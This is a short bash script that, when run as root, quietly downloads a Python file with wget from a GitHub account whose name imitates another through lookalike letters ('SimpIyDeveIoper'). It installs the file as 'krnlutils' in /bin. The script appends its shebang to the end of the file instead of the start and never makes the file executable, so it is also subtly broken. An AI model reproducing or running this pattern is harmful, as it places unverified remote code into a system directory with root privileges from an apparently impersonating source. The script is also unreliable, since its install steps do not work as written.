if [[ "$(whoami)" = 'root' ]];
then
cd /bin 
wget https://raw.githubusercontent.com/SimpIyDeveIoper/KrnlUtils/main/KrnlUtils.py -O krnlutils > /dev/null 
python3path="$(which python3)"
echo "#!${python3path}" >> krnlutils
else
echo 'This script must be runned with root'
fi
